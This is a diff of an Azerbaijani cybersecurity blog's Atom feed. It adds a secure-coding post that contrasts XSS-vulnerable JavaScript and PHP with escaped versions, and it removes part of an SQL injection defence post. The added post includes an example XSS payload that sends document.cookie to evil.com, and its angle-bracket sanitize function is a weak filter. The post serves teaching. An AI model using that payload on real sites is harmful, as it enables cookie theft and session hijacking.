@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://cybershieldy.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://cybershieldy.com/" rel="alternate" type="text/html" /><updated>2025-12-14T12:17:40+04:00</updated><id>https://cybershieldy.com/feed.xml</id><title type="html">Cybershieldy Academy — Cybersecurity &amp;amp; Web Development Training</title><subtitle>Emin Savaylov-un rəsmi kiber təhlükəsizlik bloqu və təlimlər saytı. Red Team, Blue Team, OSCP hazırlığı, real-world pentest nümunələri və daha çoxu.</subtitle><entry><title type="html">IoT Ev Cihazları Necə Hacklənir? Robot Tozsoran Hücumları, Ağıllı Evlərdə Real Təhlükələr və Müdafiə Yolları (2025)</title><link href="https://cybershieldy.com/posts/iot-ev-cihazlari-hacking" rel="alternate" type="text/html" title="IoT Ev Cihazları Necə Hacklənir? Robot Tozsoran Hücumları, Ağıllı Evlərdə Real Təhlükələr və Müdafiə Yolları (2025)" /><published>2025-12-09T12:00:00+04:00</published><updated>2025-12-11T00:36:00+04:00</updated><id>https://cybershieldy.com/posts/iot-ev-cihazlari-hacking-kibertelhukesizlik</id><content type="html" xml:base="https://cybershieldy.com/posts/iot-ev-cihazlari-hacking"><![CDATA[<h1 id="iot-ev-cihazları-necə-hacklənir">IoT Ev Cihazları Necə Hacklənir?</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://cybershieldy.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://cybershieldy.com/" rel="alternate" type="text/html" /><updated>2025-12-14T12:36:40+04:00</updated><id>https://cybershieldy.com/feed.xml</id><title type="html">Cybershieldy Academy — Cybersecurity &amp;amp; Web Development Training</title><subtitle>Emin Savaylov-un rəsmi kiber təhlükəsizlik bloqu və təlimlər saytı. Red Team, Blue Team, OSCP hazırlığı, real-world pentest nümunələri və daha çoxu.</subtitle><entry><title type="html">IoT Ev Cihazları Necə Hacklənir? Robot Tozsoran Hücumları, Ağıllı Evlərdə Real Təhlükələr və Müdafiə Yolları (2025)</title><link href="https://cybershieldy.com/posts/iot-ev-cihazlari-hacking" rel="alternate" type="text/html" title="IoT Ev Cihazları Necə Hacklənir? Robot Tozsoran Hücumları, Ağıllı Evlərdə Real Təhlükələr və Müdafiə Yolları (2025)" /><published>2025-12-09T12:00:00+04:00</published><updated>2025-12-11T00:36:00+04:00</updated><id>https://cybershieldy.com/posts/iot-ev-cihazlari-hacking-kibertelhukesizlik</id><content type="html" xml:base="https://cybershieldy.com/posts/iot-ev-cihazlari-hacking"><![CDATA[<h1 id="iot-ev-cihazları-necə-hacklənir">IoT Ev Cihazları Necə Hacklənir?</h1>
 <h2 id="robot-tozsoranlar-ağıllı-evlər-və-real-hacking-ssenariləri-2025">Robot Tozsoranlar, Ağıllı Evlər və Real Hacking Ssenariləri (2025)</h2>
 
 <p>Son illərdə <strong>IoT ev cihazları</strong> sürətlə yayılıb. Robot tozsoranlar, smart TV-lər, IP kameralar və ağıllı qapı kilidləri artıq adi ev avadanlığına çevrilib. Lakin bu rahatlıqla yanaşı, <strong>kibertəhlükəsizlik problemləri</strong> də eyni sürətlə artır.</p>
@@ -739,7 +739,274 @@ maxretry = 5</p>
   <li><a href="/posts/ufw-firewall">Linux-da UFW ilə FireWall Qurulumu</a></li>
   <li><a href="/posts/ssh-key-tutorial">SSH Key ilə Şifrəsiz Giriş</a></li>
   <li><a href="/posts/red-team-vs-blue-team">Red Team vs Blue Team — 2025</a></li>
-</ul>]]></content><author><name></name></author><category term="təhlükəsizlik" /><category term="server" /><category term="cybersecurity" /><category term="ssh" /><category term="brute force" /><category term="fail2ban" /><category term="linux təhlükəsizliyi" /><category term="blue team" /><category term="kiberhücum" /><category term="cybersecurity kursu" /><category term="ethical hacking" /><category term="red team" /><category term="penetration testing" /><summary type="html"><![CDATA[Real SSH brute-force hücumu, Hydra ilə canlı sınaq və Fail2Ban müdafiəsi. Öğrənmək istəyənlər üçün 2025 yenilənmiş cyber security tədris materialı — Emin Savaylov.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://cybershieldy.com/assets/images/brute.webp" /><media:content medium="image" url="https://cybershieldy.com/assets/images/brute.webp" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Kompyuter Virusları və Exploitlər — Fərqlər, Nümunələr və Müdafiə (2025)</title><link href="https://cybershieldy.com/posts/kompyuter-viruslari-exploit" rel="alternate" type="text/html" title="Kompyuter Virusları və Exploitlər — Fərqlər, Nümunələr və Müdafiə (2025)" /><published>2025-11-08T09:00:00+04:00</published><updated>2025-11-17T17:56:45+04:00</updated><id>https://cybershieldy.com/posts/kompyuter-viruslari-exploit-ferqi</id><content type="html" xml:base="https://cybershieldy.com/posts/kompyuter-viruslari-exploit"><![CDATA[<h1 id="-kompyuter-virusları-exploit-və-sızma-sistemləri--fərqlər-nümunələr-və-müdafiə-2025">🦠 Kompyuter Virusları, Exploit və Sızma Sistemləri — Fərqlər, Nümunələr və Müdafiə (2025)</h1>
+</ul>]]></content><author><name></name></author><category term="təhlükəsizlik" /><category term="server" /><category term="cybersecurity" /><category term="ssh" /><category term="brute force" /><category term="fail2ban" /><category term="linux təhlükəsizliyi" /><category term="blue team" /><category term="kiberhücum" /><category term="cybersecurity kursu" /><category term="ethical hacking" /><category term="red team" /><category term="penetration testing" /><summary type="html"><![CDATA[Real SSH brute-force hücumu, Hydra ilə canlı sınaq və Fail2Ban müdafiəsi. Öğrənmək istəyənlər üçün 2025 yenilənmiş cyber security tədris materialı — Emin Savaylov.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://cybershieldy.com/assets/images/brute.webp" /><media:content medium="image" url="https://cybershieldy.com/assets/images/brute.webp" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Ağıllı Alqoritm və Güclü Coding: Kibertəhlükəsizlikdə Kodlaşdırmanın Real Rolu və Təhlükəli Səhvlər (2025)</title><link href="https://cybershieldy.com/posts/secure-coding-algoritm" rel="alternate" type="text/html" title="Ağıllı Alqoritm və Güclü Coding: Kibertəhlükəsizlikdə Kodlaşdırmanın Real Rolu və Təhlükəli Səhvlər (2025)" /><published>2025-11-13T16:00:00+04:00</published><updated>2025-11-13T16:00:00+04:00</updated><id>https://cybershieldy.com/posts/algoritm-secure-coding-kibertelhukesizlik</id><content type="html" xml:base="https://cybershieldy.com/posts/secure-coding-algoritm"><![CDATA[<h1 id="ağıllı-alqoritm-və-güclü-coding">Ağıllı Alqoritm və Güclü Coding</h1>
+<h2 id="kibertəhlükəsizlikdə-kodlaşdırmanın-real-gücü-və-funksionallığı-2025">Kibertəhlükəsizlikdə Kodlaşdırmanın Real Gücü və Funksionallığı (2025)</h2>
+
+<p>Müasir <strong>kibertəhlükəsizlik</strong> artıq təkcə firewall və antivirusdan ibarət deyil.<br />
+Əsl müdafiə <strong>kodun içində</strong>, daha dəqiq desək <strong>alqoritmik düşüncədə</strong> başlayır.</p>
+
+<p>Bugünkü real hücumların böyük hissəsi:</p>
+<ul>
+  <li>zəif yazılmış kod</li>
+  <li>yanlış alqoritmik qərarlar</li>
+  <li>istifadəçi input-unun düzgün yoxlanmaması</li>
+</ul>
+
+<p>nəticəsində baş verir.</p>
+
+<p>Bu səbəbdən <strong>kibertəhlükəsizlik kursları</strong>, <strong>hacking dərsləri</strong> və<br />
+<strong>web təhlükəsizlik təlimləri</strong> coding üzərində qurulur.</p>
+
+<hr />
+
+<h2 id="alqoritmik-düşüncə-nədir">Alqoritmik Düşüncə Nədir?</h2>
+
+<p>Alqoritmik düşüncə —<br />
+<strong>“Hacker bu kodu necə sındıra bilər?”</strong> sualını kod yazmazdan əvvəl verməkdir.</p>
+
+<p>Bu düşüncə:</p>
+<ul>
+  <li>hücumu əvvəlcədən proqnozlaşdırır</li>
+  <li>riskləri azaldır</li>
+  <li>sistemin davranışını nəzarətdə saxlayır</li>
+</ul>
+
+<p>Kod yazmaq olar.<br />
+<strong>Təhlükəsiz kod yazmaq isə alqoritmdir.</strong></p>
+
+<hr />
+
+<h2 id="güclü-coding-kibertəhlükəsizlikdə-nə-verir">Güclü Coding Kibertəhlükəsizlikdə Nə Verir?</h2>
+
+<p>Güclü coding:</p>
+<ul>
+  <li>istifadəçiyə kor-koranə etibar etmir</li>
+  <li>input və output-u ayırır</li>
+  <li>hücum ssenarilərini nəzərə alır</li>
+  <li>avtomat hücumları bloklayır</li>
+</ul>
+
+<p>Zəif coding aşağıdakı riskləri yaradır:</p>
+<ul>
+  <li>Cross-Site Scripting (XSS)</li>
+  <li>SQL Injection</li>
+  <li>Remote Code Execution (RCE)</li>
+  <li>Account Takeover</li>
+</ul>
+
+<p>Bu mövzular <strong>web hacking dərsləri</strong>ndə əsas praktik mövzulardandır.</p>
+
+<hr />
+
+<h2 id="javascript-də-real-təhlükə-xss-hücumu">JavaScript-də Real Təhlükə: XSS Hücumu</h2>
+
+<h3 id="-zəif-javascript-kodu-xss-a-açıq">❌ Zəif JavaScript Kodu (XSS-a Açıq)</h3>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">userInput</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">q=</span><span class="dl">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
+<span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">result</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">userInput</span><span class="p">;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Niyə təhlükəlidir?</strong></p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">innerHTML</code> istifadə olunur</li>
+  <li>input filtr edilmir</li>
+  <li>istifadəçi JavaScript inject edə bilir</li>
+</ul>
+
+<p><strong>Hacker payload:</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>?q=&lt;script&gt;alert('Hacked')&lt;/script&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Nəticə:</strong></p>
+<ul>
+  <li>JavaScript icra olunur</li>
+  <li>cookie oğurluğu mümkündür</li>
+  <li>session hijacking baş verir</li>
+</ul>
+
+<p>Bu klassik <strong>Reflected XSS</strong> nümunəsidir.</p>
+
+<h3 id="-təhlükəsiz-javascript-yanaşması">✅ Təhlükəsiz JavaScript Yanaşması</h3>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">userInput</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">q=</span><span class="dl">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
+<span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">result</span><span class="dl">"</span><span class="p">).</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">userInput</span><span class="p">;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>və ya:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="kd">function</span> <span class="nf">sanitize</span><span class="p">(</span><span class="nx">input</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="nx">input</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">[</span><span class="sr">&lt;&gt;</span><span class="se">]</span><span class="sr">/g</span><span class="p">,</span> <span class="dl">""</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Bu sadə dəyişiklik <strong>alqoritmik düzgün qərardır</strong>.</p>
+
+<hr />
+
+<h2 id="php-də-təhlükəli-coding-səhvi">PHP-də Təhlükəli Coding Səhvi</h2>
+
+<h3 id="-zəif-php-kodu">❌ Zəif PHP Kodu</h3>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
+<span class="k">echo</span> <span class="s2">"Salam "</span> <span class="mf">.</span> <span class="nv">$name</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Risklər:</strong></p>
+<ul>
+  <li>XSS hücumu</li>
+  <li>HTML injection</li>
+  <li>JavaScript icrası</li>
+</ul>
+
+<p><strong>Hacker payload:</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>?name=&lt;script&gt;fetch('https://evil.com?c='+document.cookie)&lt;/script&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="-təhlükəsiz-php-kodu-secure-coding">✅ Təhlükəsiz PHP Kodu (Secure Coding)</h3>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="nv">$name</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'name'</span><span class="p">],</span> <span class="no">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">"Salam "</span> <span class="mf">.</span> <span class="nv">$name</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Bu kod:</p>
+<ul>
+  <li>XSS-in qarşısını alır</li>
+  <li>output-u escape edir</li>
+  <li>sistem təhlükəsizliyini artırır</li>
+</ul>
+
+<hr />
+
+<h2 id="alqoritm-olmadan-kod-yazmağın-riski">Alqoritm Olmadan Kod Yazmağın Riski</h2>
+
+<p>Əgər developer bu sualları vermirsə, sistem risk altındadır:</p>
+<ul>
+  <li>Input haradan gəlir?</li>
+  <li>Hacker bunu necə dəyişə bilər?</li>
+  <li>Bu funksiya avtomatik hücuma açıqdırmı?</li>
+  <li>Rate limit varmı?</li>
+</ul>
+
+<p>Bu suallar <strong>kiber dərslər</strong> zamanı refleks halına gətirilir.</p>
+
+<hr />
+
+<h2 id="real-hücum-ssenarisi">Real Hücum Ssenarisi</h2>
+
+<p><strong>Arxitektura:</strong></p>
+<ul>
+  <li>JavaScript frontend</li>
+  <li>PHP backend</li>
+  <li>Login sistemi</li>
+</ul>
+
+<p><strong>Səhvlər:</strong></p>
+<ul>
+  <li>input validation yoxdur</li>
+  <li>session düzgün qorunmur</li>
+</ul>
+
+<p><strong>Nəticə:</strong></p>
+<ul>
+  <li>Stored XSS</li>
+  <li>Admin account takeover</li>
+  <li>Tam sistem kompromisi</li>
+</ul>
+
+<p>Bu ssenarilər <strong>penetration testing dərsləri</strong>ndə real lab üzərində öyrədilir.</p>
+
+<hr />
+
+<h2 id="secure-coding-in-qızıl-qaydaları">Secure Coding-in Qızıl Qaydaları</h2>
+
+<ul>
+  <li>Heç vaxt istifadəçiyə etibar etmə</li>
+  <li>Input → validate et</li>
+  <li>Output → escape et</li>
+  <li><code class="language-plaintext highlighter-rouge">innerHTML</code>-dən uzaq dur</li>
+  <li>Server-side yoxlamanı unutma</li>
+  <li>Error mesajlarını gizlət</li>
+  <li>Alqoritmik düşün</li>
+</ul>
+
+<hr />
+
+<h2 id="niyə-kiber-kurslarında-coding-şərtdir">Niyə Kiber Kurslarında Coding Şərtdir?</h2>
+
+<p>Çünki:</p>
+<ul>
+  <li>Hacker kod oxuyur</li>
+  <li>Defender kod yazır</li>
+  <li>Tool yalnız köməkçidir</li>
+</ul>
+
+<p><strong>Kibertəhlükəsizlik dərsləri coding olmadan yarımçıqdır.</strong></p>
+
+<hr />
+
+<h2 id="kimlər-üçün-vacibdir">Kimlər Üçün Vacibdir?</h2>
+
+<ul>
+  <li>Web developer-lər</li>
+  <li>JavaScript və PHP proqramçıları</li>
+  <li>Ethical hacking öyrənənlər</li>
+  <li>Kibertəhlükəsizlik üzrə karyera istəyənlər</li>
+</ul>
+
+<hr />
+
+<h2 id="nəticə">Nəticə</h2>
+
+<p><strong>Ağıllı alqoritm + güclü coding = real kibertəhlükəsizlik</strong></p>
+
+<p>Kod:</p>
+<ul>
+  <li>səni qoruya da bilər</li>
+  <li>səni sındıra da bilər</li>
+</ul>
+
+<p><strong>Seçim — alqoritmik düşünəndədir.</strong></p>
+
+<hr />
+
+<p>📞 <strong>Praktiki Secure Coding və Kiber Təlimlər</strong></p>
+
+<p>📲 WhatsApp ilə əlaqə<br />
+<strong>CyberShieldy Academy</strong><br />
+<em>Kibertəhlükəsizlik Kursları • Hacking Dərsləri • Hacker Kurslar • Web Təhlükəsizlik • Real Hücum Ssenariləri</em></p>
+
+<hr />
+
+<p>İstəsən növbəti mərhələdə:</p>
+<ul>
+  <li>🔥 SQL Injection (PHP PDO)</li>
+  <li>🔥 CSRF real hücum + müdafiə</li>
+  <li>🔥 JWT auth səhvləri</li>
+  <li>🔥 Tam secure login alqoritmi (front + back)</li>
+</ul>
+
+<p>De hansını yazım, <strong>kurs səviyyəsində</strong> davam edək 🛡️💻</p>]]></content><author><name></name></author><category term="kibertəhlükəsizlik" /><category term="proqramlaşdırma" /><category term="web təhlükəsizlik" /><category term="kibertəhlükəsizlik kursları" /><category term="kiber dərslər" /><category term="hacking dərsləri" /><category term="hacker kurslar" /><category term="secure coding" /><category term="javascript təhlükəsizlik" /><category term="php təhlükəsizlik" /><category term="xss hücumu" /><category term="web hacking" /><summary type="html"><![CDATA[Ağıllı alqoritm və güclü coding kibertəhlükəsizlikdə niyə əsasdır? JavaScript və PHP kod səhvləri necə XSS və real hücumlara səbəb olur? 2025 üçün praktik və dərin secure coding bələdçisi.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://cybershieldy.com/assets/images/secure-coding.webp" /><media:content medium="image" url="https://cybershieldy.com/assets/images/secure-coding.webp" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Kompyuter Virusları və Exploitlər — Fərqlər, Nümunələr və Müdafiə (2025)</title><link href="https://cybershieldy.com/posts/kompyuter-viruslari-exploit" rel="alternate" type="text/html" title="Kompyuter Virusları və Exploitlər — Fərqlər, Nümunələr və Müdafiə (2025)" /><published>2025-11-08T09:00:00+04:00</published><updated>2025-11-17T17:56:45+04:00</updated><id>https://cybershieldy.com/posts/kompyuter-viruslari-exploit-ferqi</id><content type="html" xml:base="https://cybershieldy.com/posts/kompyuter-viruslari-exploit"><![CDATA[<h1 id="-kompyuter-virusları-exploit-və-sızma-sistemləri--fərqlər-nümunələr-və-müdafiə-2025">🦠 Kompyuter Virusları, Exploit və Sızma Sistemləri — Fərqlər, Nümunələr və Müdafiə (2025)</h1>
 
 <p><strong>Qısa xülasə:</strong><br />
 Bu məqalədə kompüter viruslarının nə olduğu, exploitlərin necə işlədiyi və sızma aşkarlama / qarşısını alma (IDS/IPS/EDR) sistemlərinin bu təhlükələrə qarşı necə müdaxilə etdiyi ətraflı şəkildə izah edilir. Məqsəd — həm texniki oxuculara, həm də təhlükəsizlik üzrə qərar verənlərə praktik və aydın məlumat verməkdir.</p>
@@ -1641,193 +1908,4 @@ A: Rəsmi etik komanda, hüquqi məsləhət və təşkilati icazə olmadan Dark 
     "@id": "https://cybershieldy.com/posts/viruslar-telefon-hucumlari-msfconsole"
   }
 }
-</script>]]></content><author><name></name></author><category term="kiber təhlükəsizlik" /><category term="malware" /><category term="mobil təhlükəsizlik" /><category term="incident response" /><category term="virus" /><category term="mobile malware" /><category term="telefon virusu" /><category term="komputer virusu" /><category term="msfconsole" /><category term="malware analysis" /><category term="ransomware" /><category term="spyware" /><category term="trojan" /><category term="phishing" /><category term="android virus" /><category term="ios security" /><category term="cyber hygiene" /><category term="antivirus" /><summary type="html"><![CDATA[Telefon və kompüter viruslarının necə işlədiyini, yeni hücum növlərini, telefonun və kompüterin yoluxma yollarını, simptomları, aşkarlama və təmizləmə üsullarını və msfconsole-un etik pentest kontekstində nə olduğunu öyrənin.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://cybershieldy.com/assets/images/malware.webp" /><media:content medium="image" url="https://cybershieldy.com/assets/images/malware.webp" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">SQL Injection Hücumları və Müdafiə Yolları – Veb Təhlükəsizlikdə Ən Böyük Risk (2025)</title><link href="https://cybershieldy.com/posts/sql-injection-2025" rel="alternate" type="text/html" title="SQL Injection Hücumları və Müdafiə Yolları – Veb Təhlükəsizlikdə Ən Böyük Risk (2025)" /><published>2025-10-01T12:00:00+04:00</published><updated>2025-10-03T10:34:41+04:00</updated><id>https://cybershieldy.com/posts/sql-hucumlari</id><content type="html" xml:base="https://cybershieldy.com/posts/sql-injection-2025"><![CDATA[<h1 id="sql-injection-nədir-risklər-müdafiə-və-təhlükəsiz-kod-yazma-2025-yenilənmiş">SQL Injection nədir? Risklər, Müdafiə və Təhlükəsiz Kod Yazma (2025 Yenilənmiş)</h1>
-
-<p><strong>Yenilənmə:</strong> 10 Sentyabr 2025<br />
-<strong>Qısa xülasə:</strong> Bu məqalədə SQL Injection (SQLi) təşəkkülü, onun nəticələri, risk modelləri və tətbiqçilər üçün praktik müdafiə üsulları izah olunur. Məqsəd — müdafiə və təhlükəsiz dizayn; zərərli istismar nümunələri paylaşılmır.</p>
-
-<hr />
-
-<h2 id="-sql-injection--qısa-və-aydın-izah">🔎 SQL Injection — qısa və aydın izah</h2>
-
-<p><strong>SQL Injection (SQLi)</strong> — veb tətbiqin verilənlər bazasına göndərdiyi SQL sorğularında istifadəçi daxil olan dəyərləri lazımi şəkildə təmizləməməsi və ya parametrizasiya etməməsi nəticəsində, kənar istəklərin SQL sorğularına təsir göstərməsi vəziyyətidir. Bunun nəticəsində məlumat sızması, yetkisiz əməliyyatlar və tətbiqə tam nəzarət itirilməsi kimi ciddi zərərlər yarana bilər.</p>
-
-<hr />
-
-<h2 id="️-nə-üçün-sqli-təhlükəlidir">⚠️ Nə üçün SQLi təhlükəlidir?</h2>
-
-<ul>
-  <li><strong>Məlumat sızması</strong></li>
-  <li><strong>Avtorizasiya pozuntuları</strong></li>
-  <li><strong>Məlumatların dəyişdirilməsi və məhv edilməsi</strong></li>
-  <li><strong>Təşkilati risklər</strong></li>
-</ul>
-
-<blockquote>
-  <p><strong>Etik qeyd:</strong> Bu məqalə müdafiə məqsədi ilə yazılıb. Zərərli payload-lar və istismar addımları verilmir.</p>
-</blockquote>
-
-<hr />
-
-<h2 id="-təhlükə-modeli-threat-model">🧠 Təhlükə modeli (Threat Model)</h2>
-
-<ol>
-  <li>Hüquqlar və təsir</li>
-  <li>Giriş vektoru</li>
-  <li>Mühit və məhdudiyyətlər</li>
-  <li>Ehtimal</li>
-</ol>
-
-<hr />
-
-<h2 id="-sql-injectiondan-qorunma--əsas-prinsiplər">✅ SQL Injection‑dan QORUNMA — əsas prinsiplər</h2>
-
-<ol>
-  <li>Parametrizasiya / Prepared statements</li>
-  <li>ORM və ya query builder</li>
-  <li>Input validation və output encoding</li>
-  <li>Least privilege</li>
-  <li>WAF və filtrasiya</li>
-  <li>Logging və monitorinq</li>
-  <li>CI/CD‑də təhlükəsizlik yoxlamaları</li>
-  <li>Təlim və prosedurlar</li>
-</ol>
-
-<hr />
-
-<h2 id="-təhlükəsiz-kod-nümunələri-parametrizasiya">🧩 Təhlükəsiz kod nümunələri (parametrizasiya)</h2>
-
-<h3 id="php-pdo">PHP (PDO)</h3>
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-</pre></td><td class="rouge-code"><pre><span class="nv">$pdo</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PDO</span><span class="p">(</span><span class="mf">...</span><span class="p">);</span>
-<span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="nf">prepare</span><span class="p">(</span><span class="s2">"SELECT * FROM users WHERE email = :email"</span><span class="p">);</span>
-<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">execute</span><span class="p">([</span><span class="s1">'email'</span> <span class="o">=&gt;</span> <span class="nv">$userInputEmail</span><span class="p">]);</span>
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<h3 id="python-pymysql">Python (pymysql)</h3>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre><span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM users WHERE email = %s</span><span class="sh">"</span><span class="p">,</span> <span class="p">(</span><span class="n">user_email</span><span class="p">,))</span>
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<h3 id="nodejs-mysql2">Node.js (mysql2)</h3>
-<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="p">[</span><span class="nx">rows</span><span class="p">]</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">db</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="dl">"</span><span class="s2">SELECT * FROM users WHERE email = ?</span><span class="dl">"</span><span class="p">,</span> <span class="p">[</span><span class="nx">email</span><span class="p">]);</span>
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<h3 id="java-jdbc">Java (JDBC)</h3>
-<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-</pre></td><td class="rouge-code"><pre><span class="nc">PreparedStatement</span> <span class="n">ps</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="s">"SELECT * FROM users WHERE email = ?"</span><span class="o">);</span>
-<span class="n">ps</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">userEmail</span><span class="o">);</span>
-<span class="nc">ResultSet</span> <span class="n">rs</span> <span class="o">=</span> <span class="n">ps</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">();</span>
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<hr />
-
-<h2 id="-input-validation--output-handling">🔧 Input validation &amp; output handling</h2>
-
-<ul>
-  <li>Allow‑list formatları</li>
-  <li>Length limiti</li>
-  <li>Type checking</li>
-  <li>Context‑specific encoding</li>
-</ul>
-
-<hr />
-
-<h2 id="-test-və-aşkarlama-strategiyaları">🧪 Test və aşkarlama strategiyaları</h2>
-
-<ul>
-  <li>SAST</li>
-  <li>DAST</li>
-  <li>Manual code review</li>
-  <li>Unit/integration testlər</li>
-  <li>Logging və alerting</li>
-</ul>
-
-<hr />
-
-<h2 id="-arxitektura-və-infrastruktur">🏗 Arxitektura və infrastruktur</h2>
-
-<ul>
-  <li>Least privilege</li>
-  <li>Separation of concerns</li>
-  <li>Read‑only replikalar</li>
-  <li>Encryption</li>
-  <li>WAF</li>
-</ul>
-
-<hr />
-
-<h2 id="-quick-checklist">✅ Quick checklist</h2>
-
-<ul class="task-list">
-  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />SQL-lər parametrizə olunub?</li>
-  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Input validation tətbiq olunub?</li>
-  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />DB hüquqları məhduddur?</li>
-  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />ORM düzgün qurulub?</li>
-  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />WAF və logging aktivdir?</li>
-  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />CI skanlar var?</li>
-  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Təlimlər keçirilib?</li>
-</ul>
-
-<hr />
-
